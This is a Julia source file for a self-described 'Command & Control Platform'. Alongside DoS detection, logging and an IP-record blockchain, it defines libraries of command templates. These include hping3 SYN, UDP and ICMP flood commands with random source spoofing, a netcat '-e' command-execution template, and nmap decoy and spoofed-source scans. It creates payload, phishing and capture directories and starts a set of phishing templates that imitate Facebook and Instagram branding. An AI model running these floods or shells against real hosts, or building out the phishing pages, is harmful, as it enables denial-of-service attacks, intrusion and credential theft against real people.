#!/usr/bin/env julia
# ============================================================================
# KIKI-SERVER-V1
# Advanced Cybersecurity Command & Control Platform
# Language: Julia (1.6+)
# Version: 1.0.0
# ============================================================================

module KikiServerV1

using Sockets
using Dates
using Random
using Printf
using SHA
using Statistics
using Base.Threads

# ============================================================================
# SECTION 1: CONSTANTS
# ============================================================================

const APP_NAME    = "kiki-server-v1"
const APP_VERSION = "1.0.0"
const GENESIS_HASH = "0"^64
const DIFFICULTY  = 3

const DOS_THRESHOLD            = 100
const DDOS_THRESHOLD           = 1000
const HTTP_FLOOD_THRESHOLD     = 50
const HTTPS_FLOOD_THRESHOLD    = 50
const DDOS_UNIQUE_IP_THRESHOLD = 20
const MONITOR_WINDOW           = 10

const BASE_DIR     = ".kiki_server"
const LOG_DIR      = joinpath(BASE_DIR, "logs")
const DATA_DIR     = joinpath(BASE_DIR, "data")
const PAYLOAD_DIR  = joinpath(BASE_DIR, "payloads")
const REPORT_DIR   = joinpath(BASE_DIR, "reports")
const PHISH_DIR    = joinpath(BASE_DIR, "phishing")
const CAPTURE_DIR  = joinpath(BASE_DIR, "captured")
const SSH_DIR      = joinpath(BASE_DIR, "ssh")
const CHAIN_FILE   = joinpath(DATA_DIR, "blockchain.dat")
const LOG_FILE     = joinpath(LOG_DIR,  "kiki.log")

for d in (BASE_DIR, LOG_DIR, DATA_DIR, PAYLOAD_DIR, REPORT_DIR,
          PHISH_DIR, CAPTURE_DIR, SSH_DIR)
    isdir(d) || mkpath(d)
end

# ============================================================================
# SECTION 2: MINIMAL JSON ENCODER (no external deps)
# ============================================================================

function json_escape(s::AbstractString)::String
    out = IOBuffer()
    for c in s
        if c == '"';      print(out, "\\\"")
        elseif c == '\\'; print(out, "\\\\")
        elseif c == '\n'; print(out, "\\n")
        elseif c == '\r'; print(out, "\\r")
        elseif c == '\t'; print(out, "\\t")
        elseif c < ' ';   @printf(out, "\\u%04x", Int(c))
        else;             print(out, c)
        end
    end
    return String(take!(out))
end

function to_json(v)
    if v === nothing;            return "null"
    elseif v isa Bool;           return v ? "true" : "false"
    elseif v isa Integer;        return string(v)
    elseif v isa AbstractFloat;  return string(v)
    elseif v isa AbstractString; return "\"" * json_escape(v) * "\""
    elseif v isa AbstractDict
        parts = String[]
        for (k, val) in v
            push!(parts, "\"" * json_escape(string(k)) * "\":" * to_json(val))
        end
        return "{" * join(parts, ",") * "}"
    elseif v isa AbstractVector
        return "[" * join([to_json(x) for x in v], ",") * "]"
    else
        return "\"" * json_escape(string(v)) * "\""
    end
end

# ============================================================================
# SECTION 3: LOGGER
# ============================================================================

mutable struct Logger
    level::Symbol
    io::Union{Nothing, IO}
    lock::ReentrantLock
end

function Logger(level::Symbol=:info, path::Union{Nothing,String}=nothing)
    io = path === nothing ? nothing : open(path, "a")
    Logger(level, io, ReentrantLock())
end

const LEVELS = Dict(:debug=>1, :info=>2, :warn=>3, :error=>4)

function logmsg(lg::Logger, level::Symbol, msg::String)
    LEVELS[level] < LEVELS[lg.level] && return
    lock(lg.lock)
    try
        ts = Dates.format(now(), "yyyy-mm-dd HH:MM:SS")
        line = "[$ts][$(uppercase(string(level)))] $msg"
        println(line)
        if lg.io !== nothing
            println(lg.io, line); flush(lg.io)
        end
    finally
        unlock(lg.lock)
    end
end

macro log_info(lg, msg);  :(logmsg($(esc(lg)), :info,  $(esc(msg)))); end
macro log_warn(lg, msg);  :(logmsg($(esc(lg)), :warn,  $(esc(msg)))); end
macro log_err(lg, msg);   :(logmsg($(esc(lg)), :error, $(esc(msg)))); end
macro log_dbg(lg, msg);   :(logmsg($(esc(lg)), :debug, $(esc(msg)))); end

# ============================================================================
# SECTION 4: IP UTILITIES
# ============================================================================

struct IPRecord
    ip::String
    added_at::DateTime
    added_by::String
    note::String
end

function is_valid_ip(ip::AbstractString)::Bool
    try Sockets.IPv4(ip); return true; catch; end
    try Sockets.IPv6(ip); return true; catch; end
    return false
end

normalize_ip(ip::AbstractString) = lowercase(strip(ip))

function parse_ip_list(s::AbstractString)::Vector{String}
    out = String[]
    for tok in split(replace(s, "\n" => ","), ",")
        t = strip(tok)
        isempty(t) && continue
        is_valid_ip(t) && push!(out, normalize_ip(t))
    end
    return out
end

function generate_bulk_ips(n::Int, base::String="10.1.0.0")::Vector{String}
    parts = split(base, ".")
    length(parts) == 4 || error("Base must be a.b.c.d")
    o1, o2, o3 = parse(Int, parts[1]), parse(Int, parts[2]), parse(Int, parts[3])
    ips = String[]; i = 0
    while length(ips) < n && i < 65536
        o4 = i % 256
        o3x = o3 + (i ÷ 256)
        o2x = o2
        if o3x > 255
            o2x += o3x ÷ 256; o3x %= 256
        end
        ip = "$o1.$o2x.$o3x.$o4"
        is_valid_ip(ip) && push!(ips, ip)
        i += 1
    end
    return ips
end

# ============================================================================
# SECTION 5: BLOCKCHAIN IP STORAGE
# ============================================================================

struct IPBlock
    index::Int
    timestamp::DateTime
    previous_hash::String
    data::Vector{IPRecord}
    nonce::Int
    hash::String
end

function compute_hash(index::Int, ts::DateTime, prev::String,
                      data::Vector{IPRecord}, nonce::Int)::String
    io = IOBuffer()
    print(io, index, string(ts), prev)
    for r in data
        print(io, r.ip, "|", string(r.added_at), "|", r.added_by, "|", r.note, ";")
    end
    print(io, nonce)
    return bytes2hex(sha256(take!(io)))
end

function mine_block(index::Int, prev::String, data::Vector{IPRecord})::IPBlock
    ts = now(); nonce = 0; target = "0"^DIFFICULTY
    while true
        h = compute_hash(index, ts, prev, data, nonce)
        startswith(h, target) && return IPBlock(index, ts, prev, data, nonce, h)
        nonce += 1
    end
end

mutable struct IPBlockchain
    chain::Vector{IPBlock}
    index_map::Dict{String,Int}
    lock::ReentrantLock
end

function IPBlockchain()
    g = mine_block(0, GENESIS_HASH, IPRecord[])
    IPBlockchain([g], Dict{String,Int}(), ReentrantLock())
end

function chain_valid(bc::IPBlockchain)::Bool
    for i in 2:length(bc.chain)
        cur = bc.chain[i]; prev = bc.chain[i-1]
        cur.previous_hash == prev.hash || return false
        compute_hash(cur.index, cur.timestamp, cur.previous_hash,
                     cur.data, cur.nonce) == cur.hash || return false
    end
    return true
end

function add_ips!(bc::IPBlockchain, ips::Vector{String},
                  by::String, note::String, lg::Logger)::Int
    lock(bc.lock)
    try
        new_recs = IPRecord[]
        for ip in ips
            n = normalize_ip(ip)
            is_valid_ip(n) || (logmsg(lg, :warn, "invalid ip: $ip"); continue)
            haskey(bc.index_map, n) && continue
            push!(new_recs, IPRecord(n, now(), by, note))
        end
        isempty(new_recs) && return 0
        prev = bc.chain[end]
        blk = mine_block(prev.index + 1, prev.hash, new_recs)
        push!(bc.chain, blk)
        for r in new_recs; bc.index_map[r.ip] = blk.index; end
        logmsg(lg, :info, "mined block #$(blk.index) with $(length(new_recs)) IPs")
        return length(new_recs)
    finally
        unlock(bc.lock)
    end
end

function ip_exists(bc::IPBlockchain, ip::String)::Bool
    lock(bc.lock)
    try
        return haskey(bc.index_map, normalize_ip(ip))
    finally
        unlock(bc.lock)
    end
end

function list_ips(bc::IPBlockchain)::Vector{IPRecord}
    lock(bc.lock)
    try
        out = IPRecord[]
        for b in bc.chain; append!(out, b.data); end
        return out
    finally
        unlock(bc.lock)
    end
end

function chain_stats(bc::IPBlockchain)
    lock(bc.lock)
    try
        return Dict(
            "blocks"     => length(bc.chain),
            "unique_ips" => length(bc.index_map),
            "valid"      => chain_valid(bc),
            "last_hash"  => bc.chain[end].hash
        )
    finally
        unlock(bc.lock)
    end
end

function save_chain(bc::IPBlockchain, path::String)
    open(path, "w") do io
        for b in bc.chain
            println(io, "BLOCK|$(b.index)|$(b.timestamp)|$(b.previous_hash)|$(b.nonce)|$(b.hash)")
            for r in b.data
                println(io, "IP|$(r.ip)|$(r.added_at)|$(r.added_by)|$(r.note)")
            end
            println(io, "END")
        end
    end
end

function load_chain(path::String)
    isfile(path) || return nothing
    bc = IPBlockchain(); empty!(bc.chain); empty!(bc.index_map)
    cur_idx = -1; cur_ts = now(); cur_prev = GENESIS_HASH
    cur_nonce = 0; cur_hash = ""; cur_data = IPRecord[]
    for line in eachline(path)
        p = split(line, "|")
        if p[1] == "BLOCK"
            cur_idx = parse(Int, p[2]); cur_ts = DateTime(p[3])
            cur_prev = p[4]; cur_nonce = parse(Int, p[5]); cur_hash = p[6]
            cur_data = IPRecord[]
        elseif p[1] == "IP"
            push!(cur_data, IPRecord(p[2], DateTime(p[3]), p[4], p[5]))
        elseif p[1] == "END"
            blk = IPBlock(cur_idx, cur_ts, cur_prev, cur_data, cur_nonce, cur_hash)
            push!(bc.chain, blk)
            for r in cur_data; bc.index_map[r.ip] = blk.index; end
        end
    end
    return length(bc.chain) > 0 ? bc : nothing
end

# ============================================================================
# SECTION 6: TRAFFIC MONITORING & DETECTION
# ============================================================================

struct PacketEvent
    timestamp::DateTime
    src_ip::String
    dst_ip::String
    src_port::Int
    dst_port::Int
    protocol::Symbol
    size::Int
    flags::String
end

mutable struct SlidingWindow
    events::Vector{PacketEvent}
    window_sec::Int
end
SlidingWindow(w::Int=MONITOR_WINDOW) = SlidingWindow(PacketEvent[], w)

function push_event!(sw::SlidingWindow, ev::PacketEvent)
    push!(sw.events, ev)
    cutoff = now() - Dates.Second(sw.window_sec)
    i = 1
    while i <= length(sw.events) && sw.events[i].timestamp < cutoff; i += 1; end
    i > 1 && deleteat!(sw.events, 1:i-1)
end

mutable struct DetectionAlert
    timestamp::DateTime
    alert_type::String
    severity::Symbol
    src_ip::String
    detail::String
end

mutable struct DetectionEngine
    dos_counts::Dict{String,Int}
    ddos_total::Int
    ddos_unique::Set{String}
    http_counts::Dict{String,Int}
    https_counts::Dict{String,Int}
    window::SlidingWindow
    alerts::Vector{DetectionAlert}
    lock::ReentrantLock
end

DetectionEngine() = DetectionEngine(
    Dict{String,Int}(), 0, Set{String}(),
    Dict{String,Int}(), Dict{String,Int}(),
    SlidingWindow(), DetectionAlert[], ReentrantLock())

function process_packet!(de::DetectionEngine, ev::PacketEvent, lg::Logger)
    lock(de.lock)
    try
        push_event!(de.window, ev)

        de.dos_counts[ev.src_ip] = get(de.dos_counts, ev.src_ip, 0) + 1
        if de.dos_counts[ev.src_ip] >= DOS_THRESHOLD
            a = DetectionAlert(now(), "DoS", :high, ev.src_ip,
                "single-IP rate $(de.dos_counts[ev.src_ip]) >= $DOS_THRESHOLD")
            push!(de.alerts, a)
            logmsg(lg, :warn, "DoS: $(a.src_ip)")
            de.dos_counts[ev.src_ip] = 0
        end

        de.ddos_total += 1
        push!(de.ddos_unique, ev.src_ip)
        if de.ddos_total >= DDOS_THRESHOLD && length(de.ddos_unique) >= DDOS_UNIQUE_IP_THRESHOLD
            a = DetectionAlert(now(), "DDoS", :critical, "MULTIPLE",
                "$(de.ddos_total) pkt/s from $(length(de.ddos_unique)) unique IPs")
            push!(de.alerts, a)
            logmsg(lg, :error, "DDoS: $(a.detail)")
            de.ddos_total = 0; empty!(de.ddos_unique)
        end

        if ev.protocol == :http
            de.http_counts[ev.src_ip] = get(de.http_counts, ev.src_ip, 0) + 1
            if de.http_counts[ev.src_ip] >= HTTP_FLOOD_THRESHOLD
                a = DetectionAlert(now(), "HTTP_Flood", :high, ev.src_ip,
                    "HTTP rate $(de.http_counts[ev.src_ip])")
                push!(de.alerts, a)
                logmsg(lg, :warn, "HTTP flood: $(a.src_ip)")
                de.http_counts[ev.src_ip] = 0
            end
        end

        if ev.protocol == :https
            de.https_counts[ev.src_ip] = get(de.https_counts, ev.src_ip, 0) + 1
            if de.https_counts[ev.src_ip] >= HTTPS_FLOOD_THRESHOLD
                a = DetectionAlert(now(), "HTTPS_Flood", :high, ev.src_ip,
                    "HTTPS rate $(de.https_counts[ev.src_ip])")
                push!(de.alerts, a)
                logmsg(lg, :warn, "HTTPS flood: $(a.src_ip)")
                de.https_counts[ev.src_ip] = 0
            end
        end
    finally
        unlock(de.lock)
    end
end

mutable struct TrafficStats
    total_packets::Int
    total_bytes::Int
    proto_counts::Dict{Symbol,Int}
    top_src::Dict{String,Int}
    lock::ReentrantLock
end
TrafficStats() = TrafficStats(0, 0, Dict{Symbol,Int}(), Dict{String,Int}(), ReentrantLock())

function record!(ts::TrafficStats, ev::PacketEvent)
    lock(ts.lock)
    try
        ts.total_packets += 1
        ts.total_bytes   += ev.size
        ts.proto_counts[ev.protocol] = get(ts.proto_counts, ev.protocol, 0) + 1
        ts.top_src[ev.src_ip]        = get(ts.top_src, ev.src_ip, 0) + 1
    finally
        unlock(ts.lock)
    end
end

function top_talkers(ts::TrafficStats, k::Int=10)
    lock(ts.lock)
    try
        items = collect(ts.top_src)
        sort!(items, by=x->x[2], rev=true)
        return items[1:min(k, length(items))]
    finally
        unlock(ts.lock)
    end
end

# ============================================================================
# SECTION 7: TRAFFIC SIMULATOR
# ============================================================================

mutable struct TrafficSimulator
    running::Bool
    task::Union{Nothing, Task}
    attackers::Vector{String}
    victims::Vector{String}
    rng::MersenneTwister
end
TrafficSimulator() = TrafficSimulator(false, nothing, String[], String[], MersenneTwister(42))

function seed_pools!(s::TrafficSimulator)
    s.attackers = ["10.0.0.$i" for i in 1:50]
    s.victims   = ["192.168.1.$(i)" for i in 1:20]
end

function random_packet!(s::TrafficSimulator)::PacketEvent
    isempty(s.attackers) && seed_pools!(s)
    r = rand(s.rng)
    src = rand(s.rng, s.attackers)
    dst = rand(s.rng, s.victims)
    proto = :tcp; dport = 80; flags = "SYN"
    sport = rand(s.rng, 1024:65535)
    sz = rand(s.rng, 64:1500)
    if r < 0.55
        proto = :tcp; dport = rand(s.rng, [80,443,22,8080])
    elseif r < 0.75
        proto = :udp; dport = rand(s.rng, [53,123,161]); flags = ""
    elseif r < 0.85
        proto = :icmp; dport = 0; flags = ""
    elseif r < 0.95
        proto = :http; dport = 80; flags = "GET"
    else
        proto = :https; dport = 443; flags = "TLS"
    end
    PacketEvent(now(), src, dst, sport, dport, proto, sz, flags)
end

function start_simulation!(sim::TrafficSimulator, de::DetectionEngine,
                           ts::TrafficStats, lg::Logger, pps::Int=200)
    sim.running && (logmsg(lg, :warn, "sim already running"); return)
    seed_pools!(sim); sim.running = true
    sim.task = @async begin
        logmsg(lg, :info, "simulator started at ~$pps pkt/s")
        interval = 1.0 / pps
        while sim.running
            ev = random_packet!(sim)
            record!(ts, ev); process_packet!(de, ev, lg)
            sleep(interval)
        end
        logmsg(lg, :info, "simulator stopped")
    end
end

function stop_simulation!(sim::TrafficSimulator, lg::Logger)
    sim.running = false
    logmsg(lg, :info, "stopping simulator...")
end

# ============================================================================
# SECTION 8: BLOCKLIST
# ============================================================================

mutable struct BlockList
    blocked::Set{String}
    reasons::Dict{String,String}
    lock::ReentrantLock
end
BlockList() = BlockList(Set{String}(), Dict{String,String}(), ReentrantLock())

function block_ip!(bl::BlockList, ip::String, reason::String, lg::Logger)
    lock(bl.lock)
    try
        push!(bl.blocked, normalize_ip(ip))
        bl.reasons[normalize_ip(ip)] = reason
        logmsg(lg, :warn, "blocked $ip ($reason)")
    finally
        unlock(bl.lock)
    end
end

function unblock_ip!(bl::BlockList, ip::String, lg::Logger)
    lock(bl.lock)
    try
        delete!(bl.blocked, normalize_ip(ip))
        delete!(bl.reasons, normalize_ip(ip))
        logmsg(lg, :info, "unblocked $ip")
    finally
        unlock(bl.lock)
    end
end

function is_blocked(bl::BlockList, ip::String)
    lock(bl.lock)
    try
        return in(normalize_ip(ip), bl.blocked)
    finally
        unlock(bl.lock)
    end
end

# ============================================================================
# SECTION 9: COMMAND LIBRARIES
# ============================================================================

const PING_COMMANDS = [
    ("ping",           ["ping", "{target}"]),
    ("ping_count",     ["ping", "-c", "{count}", "{target}"]),
    ("ping_interval",  ["ping", "-i", "{interval}", "{target}"]),
    ("ping_flood",     ["ping", "-f", "{target}"]),
    ("ping_size",      ["ping", "-s", "{size}", "{target}"]),
    ("ping_timeout",   ["ping", "-W", "{timeout}", "{target}"]),
    ("ping_ttl",       ["ping", "-t", "{ttl}", "{target}"]),
    ("ping_quiet",     ["ping", "-q", "-c", "{count}", "{target}"]),
    ("ping_verbose",   ["ping", "-v", "{target}"]),
    ("ping_numeric",   ["ping", "-n", "{target}"]),
    ("ping_audible",   ["ping", "-a", "{target}"]),
    ("ping_adaptive",  ["ping", "-A", "{target}"]),
    ("ping_record",    ["ping", "-R", "{target}"]),
    ("ping_timestamp", ["ping", "-D", "{target}"]),
    ("ping_deadline",  ["ping", "-w", "{deadline}", "{target}"]),
    ("ping_pattern",   ["ping", "-p", "{pattern}", "{target}"]),
    ("ping_ipv4",      ["ping", "-4", "{target}"]),
    ("ping_ipv6",      ["ping", "-6", "{target}"]),
    ("ping_broadcast", ["ping", "-b", "{target}"]),
    ("ping_interface", ["ping", "-I", "{interface}", "{target}"]),
    ("ping_source",    ["ping", "-S", "{source_ip}", "{target}"]),
]

const TRACEROUTE_COMMANDS = [
    ("traceroute",           ["traceroute", "{target}"]),
    ("traceroute_ipv4",      ["traceroute", "-4", "{target}"]),
    ("traceroute_ipv6",      ["traceroute", "-6", "{target}"]),
    ("traceroute_icmp",      ["traceroute", "-I", "{target}"]),
    ("traceroute_tcp",       ["traceroute", "-T", "{target}"]),
    ("traceroute_udp",       ["traceroute", "-U", "{target}"]),
    ("traceroute_max_hops",  ["traceroute", "-m", "{max_hops}", "{target}"]),
    ("traceroute_first_hop", ["traceroute", "-f", "{first_hop}", "{target}"]),
    ("traceroute_queries",   ["traceroute", "-q", "{queries}", "{target}"]),
    ("traceroute_wait",      ["traceroute", "-w", "{wait}", "{target}"]),
    ("traceroute_port",      ["traceroute", "-p", "{port}", "{target}"]),
    ("traceroute_numeric",   ["traceroute", "-n", "{target}"]),
    ("traceroute_verbose",   ["traceroute", "-v", "{target}"]),
    ("traceroute_debug",     ["traceroute", "-d", "{target}"]),
    ("traceroute_fragment",  ["traceroute", "-F", "{target}"]),
    ("traceroute_tos",       ["traceroute", "-t", "{tos}", "{target}"]),
    ("traceroute_iface",     ["traceroute", "-i", "{interface}", "{target}"]),
    ("traceroute_source",    ["traceroute", "-s", "{source_ip}", "{target}"]),
    ("traceroute_as",        ["traceroute", "-A", "{target}"]),
    ("traceroute_mtr",       ["mtr", "--report", "{target}"]),
]

const NMAP_COMMANDS = [
    ("nmap",               ["nmap", "{target}"]),
    ("nmap_quick",         ["nmap", "-T4", "-F", "{target}"]),
    ("nmap_full",          ["nmap", "-p-", "{target}"]),
    ("nmap_syn",           ["nmap", "-sS", "{target}"]),
    ("nmap_connect",       ["nmap", "-sT", "{target}"]),
    ("nmap_udp",           ["nmap", "-sU", "{target}"]),
    ("nmap_ack",           ["nmap", "-sA", "{target}"]),
    ("nmap_stealth",       ["nmap", "-sS", "-T2", "{target}"]),
    ("nmap_os",            ["nmap", "-O", "{target}"]),
    ("nmap_service",       ["nmap", "-sV", "{target}"]),
    ("nmap_vuln",          ["nmap", "--script", "vuln", "{target}"]),
    ("nmap_ping",          ["nmap", "-sn", "{target}"]),
    ("nmap_no_ping",       ["nmap", "-Pn", "{target}"]),
    ("nmap_ports",         ["nmap", "-p", "{ports}", "{target}"]),
    ("nmap_top_ports",     ["nmap", "--top-ports", "{count}", "{target}"]),
    ("nmap_aggressive",    ["nmap", "-A", "{target}"]),
    ("nmap_traceroute",    ["nmap", "--traceroute", "{target}"]),
    ("nmap_script",        ["nmap", "--script", "{script}", "{target}"]),
    ("nmap_script_http",   ["nmap", "--script", "http-*", "{target}"]),
    ("nmap_script_smb",    ["nmap", "--script", "smb-*", "{target}"]),
    ("nmap_script_ssh",    ["nmap", "--script", "ssh-*", "{target}"]),
    ("nmap_timing_T0",     ["nmap", "-T0", "{target}"]),
    ("nmap_timing_T1",     ["nmap", "-T1", "{target}"]),
    ("nmap_timing_T2",     ["nmap", "-T2", "{target}"]),
    ("nmap_timing_T3",     ["nmap", "-T3", "{target}"]),
    ("nmap_timing_T4",     ["nmap", "-T4", "{target}"]),
    ("nmap_timing_T5",     ["nmap", "-T5", "{target}"]),
    ("nmap_fragment",      ["nmap", "-f", "{target}"]),
    ("nmap_decoys",        ["nmap", "-D", "RND:{count}", "{target}"]),
    ("nmap_spoof_src",     ["nmap", "-S", "{source_ip}", "{target}"]),
    ("nmap_iface",         ["nmap", "-e", "{interface}", "{target}"]),
    ("nmap_output_normal", ["nmap", "-oN", "{output_file}", "{target}"]),
    ("nmap_output_xml",    ["nmap", "-oX", "{output_file}", "{target}"]),
    ("nmap_output_all",    ["nmap", "-oA", "{output_prefix}", "{target}"]),
    ("nmap_verbose",       ["nmap", "-v", "{target}"]),
    ("nmap_debug",         ["nmap", "-d", "{target}"]),
    ("nmap_reason",        ["nmap", "--reason", "{target}"]),
    ("nmap_open_only",     ["nmap", "--open", "{target}"]),
    ("nmap_version",       ["nmap", "-V"]),
    ("nmap_help",          ["nmap", "--help"]),
]

const CURL_COMMANDS = [
    ("curl",              ["curl", "{url}"]),
    ("curl_get",          ["curl", "-X", "GET", "{url}"]),
    ("curl_post",         ["curl", "-X", "POST", "-d", "{data}", "{url}"]),
    ("curl_put",          ["curl", "-X", "PUT", "-d", "{data}", "{url}"]),
    ("curl_delete",       ["curl", "-X", "DELETE", "{url}"]),
    ("curl_patch",        ["curl", "-X", "PATCH", "-d", "{data}", "{url}"]),
    ("curl_head",         ["curl", "-I", "{url}"]),
    ("curl_options",      ["curl", "-X", "OPTIONS", "{url}"]),
    ("curl_output",       ["curl", "-o", "{output}", "{url}"]),
    ("curl_remote_name",  ["curl", "-O", "{url}"]),
    ("curl_location",     ["curl", "-L", "{url}"]),
    ("curl_include",      ["curl", "-i", "{url}"]),
    ("curl_verbose",      ["curl", "-v", "{url}"]),
    ("curl_silent",       ["curl", "-s", "{url}"]),
    ("curl_show_error",   ["curl", "-S", "{url}"]),
    ("curl_fail",         ["curl", "-f", "{url}"]),
    ("curl_insecure",     ["curl", "-k", "{url}"]),
    ("curl_data",         ["curl", "-d", "{data}", "{url}"]),
    ("curl_data_binary",  ["curl", "--data-binary", "@{file}", "{url}"]),
    ("curl_data_urlencode",["curl", "--data-urlencode", "{data}", "{url}"]),
    ("curl_form",         ["curl", "-F", "{field}={value}", "{url}"]),
    ("curl_header",       ["curl", "-H", "{header}", "{url}"]),
    ("curl_user_agent",   ["curl", "-A", "{user_agent}", "{url}"]),
    ("curl_referer",      ["curl", "-e", "{referer}", "{url}"]),
    ("curl_user",         ["curl", "-u", "{user}:{password}", "{url}"]),
    ("curl_basic",        ["curl", "--basic", "-u", "{user}:{password}", "{url}"]),
    ("curl_digest",       ["curl", "--digest", "-u", "{user}:{password}", "{url}"]),
    ("curl_ntlm",         ["curl", "--ntlm", "-u", "{user}:{password}", "{url}"]),
    ("curl_cookie",       ["curl", "-b", "{cookie}", "{url}"]),
    ("curl_cookie_jar",   ["curl", "-c", "{cookie_file}", "{url}"]),
    ("curl_proxy",        ["curl", "-x", "{proxy}", "{url}"]),
    ("curl_cert",         ["curl", "-E", "{cert}", "{url}"]),
    ("curl_key",          ["curl", "--key", "{key}", "{url}"]),
    ("curl_cacert",       ["curl", "--cacert", "{ca}", "{url}"]),
    ("curl_range",        ["curl", "-r", "{range}", "{url}"]),
    ("curl_limit_rate",   ["curl", "--limit-rate", "{rate}", "{url}"]),
    ("curl_max_time",     ["curl", "-m", "{timeout}", "{url}"]),
    ("curl_connect_timeout",["curl", "--connect-timeout", "{timeout}", "{url}"]),
    ("curl_retry",        ["curl", "--retry", "{retries}", "{url}"]),
    ("curl_ipv4",         ["curl", "-4", "{url}"]),
    ("curl_ipv6",         ["curl", "-6", "{url}"]),
    ("curl_interface",    ["curl", "--interface", "{interface}", "{url}"]),
    ("curl_dns_servers",  ["curl", "--dns-servers", "{dns_servers}", "{url}"]),
    ("curl_resolve",      ["curl", "--resolve", "{resolve}", "{url}"]),
    ("curl_http1",        ["curl", "--http1.1", "{url}"]),
    ("curl_http2",        ["curl", "--http2", "{url}"]),
    ("curl_compressed",   ["curl", "--compressed", "{url}"]),
    ("curl_write_out",    ["curl", "-w", "{format}", "-o", "/dev/null", "{url}"]),
    ("curl_manual",       ["curl", "--manual"]),
    ("curl_help",         ["curl", "--help"]),
    ("curl_version",      ["curl", "--version"]),
    ("curl_parallel",     ["curl", "--parallel", "{url1}", "{url2}"]),
    ("curl_json",         ["curl", "-H", "Content-Type: application/json",
                            "-d", "{json}", "{url}"]),
]

const WGET_COMMANDS = [
    ("wget",              ["wget", "{url}"]),
    ("wget_output",       ["wget", "-O", "{output}", "{url}"]),
    ("wget_continue",     ["wget", "-c", "{url}"]),
    ("wget_background",   ["wget", "-b", "{url}"]),
    ("wget_quiet",        ["wget", "-q", "{url}"]),
    ("wget_verbose",      ["wget", "-v", "{url}"]),
    ("wget_spider",       ["wget", "--spider", "{url}"]),
    ("wget_recursive",    ["wget", "-r", "{url}"]),
    ("wget_mirror",       ["wget", "-m", "{url}"]),
    ("wget_input_file",   ["wget", "-i", "{input_file}"]),
    ("wget_header",       ["wget", "--header", "{header}", "{url}"]),
    ("wget_user_agent",   ["wget", "-U", "{user_agent}", "{url}"]),
    ("wget_referer",      ["wget", "--referer", "{referer}", "{url}"]),
    ("wget_cookie",       ["wget", "--load-cookies", "{cookie_file}", "{url}"]),
    ("wget_save_cookie",  ["wget", "--save-cookies", "{cookie_file}", "{url}"]),
    ("wget_limit_rate",   ["wget", "--limit-rate", "{rate}", "{url}"]),
    ("wget_timeout",      ["wget", "-T", "{timeout}", "{url}"]),
    ("wget_tries",        ["wget", "-t", "{tries}", "{url}"]),
    ("wget_no_check_cert",["wget", "--no-check-certificate", "{url}"]),
    ("wget_cert",         ["wget", "--certificate", "{cert}", "{url}"]),
    ("wget_key",          ["wget", "--private-key", "{key}", "{url}"]),
    ("wget_ca",           ["wget", "--ca-certificate", "{ca}", "{url}"]),
    ("wget_proxy",        ["wget", "-e", "use_proxy=yes",
                            "-e", "http_proxy={proxy}", "{url}"]),
    ("wget_user_pass",    ["wget", "--user", "{user}",
                            "--password", "{password}", "{url}"]),
    ("wget_post_data",    ["wget", "--post-data", "{data}", "{url}"]),
    ("wget_post_file",    ["wget", "--post-file", "{file}", "{url}"]),
    ("wget_output_dir",   ["wget", "-P", "{dir}", "{url}"]),
    ("wget_no_clobber",   ["wget", "-nc", "{url}"]),
    ("wget_timestamping", ["wget", "-N", "{url}"]),
    ("wget_version",      ["wget", "--version"]),
    ("wget_help",         ["wget", "--help"]),
]

const NETCAT_COMMANDS = [
    ("nc_connect",        ["nc", "{host}", "{port}"]),
    ("nc_listen",         ["nc", "-l", "-p", "{port}"]),
    ("nc_listen_verbose", ["nc", "-l", "-v", "-p", "{port}"]),
    ("nc_listen_keep",    ["nc", "-l", "-k", "-p", "{port}"]),
    ("nc_udp",            ["nc", "-u", "{host}", "{port}"]),
    ("nc_udp_listen",     ["nc", "-u", "-l", "-p", "{port}"]),
    ("nc_scan",           ["nc", "-z", "{host}", "{port}"]),
    ("nc_scan_range",     ["nc", "-z", "{host}", "{port_range}"]),
    ("nc_scan_verbose",   ["nc", "-z", "-v", "{host}", "{port_range}"]),
    ("nc_timeout",        ["nc", "-w", "{timeout}", "{host}", "{port}"]),
    ("nc_banner",         ["nc", "-v", "{host}", "{port}"]),
    ("nc_exec",           ["nc", "{host}", "{port}", "-e", "{command}"]),
    ("nc_help",           ["nc", "-h"]),
]

const SSH_COMMANDS = [
    ("ssh",              ["ssh", "{user}@{host}"]),
    ("ssh_port",         ["ssh", "-p", "{port}", "{user}@{host}"]),
    ("ssh_identity",     ["ssh", "-i", "{key}", "{user}@{host}"]),
    ("ssh_exec",         ["ssh", "{user}@{host}", "{command}"]),
    ("ssh_verbose",      ["ssh", "-v", "{user}@{host}"]),
    ("ssh_local_forward",["ssh", "-L", "{lport}:{rhost}:{rport}", "{user}@{host}"]),
    ("ssh_remote_forward",["ssh","-R","{rport}:{lhost}:{lport}","{user}@{host}"]),
    ("ssh_dynamic_forward",["ssh", "-D", "{lport}", "{user}@{host}"]),
    ("ssh_jump",         ["ssh", "-J", "{juser}@{jhost}", "{user}@{host}"]),
    ("ssh_version",      ["ssh", "-V"]),
    ("scp",              ["scp", "{src}", "{user}@{host}:{dst}"]),
    ("sftp",             ["sftp", "{user}@{host}"]),
    ("ssh_keygen",       ["ssh-keygen", "-t", "rsa", "-b", "{bits}",
                          "-f", "{keyfile}"]),
    ("ssh_copy_id",      ["ssh-copy-id", "-i", "{keyfile}", "{user}@{host}"]),
]

const DOS_COMMANDS = [
    ("hping3_syn",       ["hping3", "-S", "--flood", "-p", "{port}", "{target}"]),
    ("hping3_udp",       ["hping3", "--udp", "--flood", "-p", "{port}", "{target}"]),
    ("hping3_icmp",      ["hping3", "--icmp", "--flood", "{target}"]),
    ("hping3_ack",       ["hping3", "-A", "--flood", "-p", "{port}", "{target}"]),
    ("hping3_fin",       ["hping3", "-F", "--flood", "-p", "{port}", "{target}"]),
    ("hping3_xmas",      ["hping3", "-X", "--flood", "-p", "{port}", "{target}"]),
    ("hping3_null",      ["hping3", "-Y", "--flood", "-p", "{port}", "{target}"]),
    ("hping3_rand_src",  ["hping3", "--rand-source", "-S",
                          "--flood", "-p", "{port}", "{target}"]),
    ("hping3_data_size", ["hping3", "-S", "--flood",
                          "-d", "{size}", "-p", "{port}", "{target}"]),
    ("hping3_count",     ["hping3", "-S", "-c", "{count}",
                          "-p", "{port}", "{target}"]),
    ("hping3_interval",  ["hping3", "-S", "-i", "u{interval}",
                          "-p", "{port}", "{target}"]),
]

# ============================================================================
# SECTION 10: SOCIAL ENGINEERING (120+ TEMPLATES)
# ============================================================================

const PHISH_PLATFORMS = Dict{String, Tuple{String, String}}(
    "facebook"      => ("#1877f2", "Facebook"),
    "instagram"     => ("#0095f6", "Instagram"),
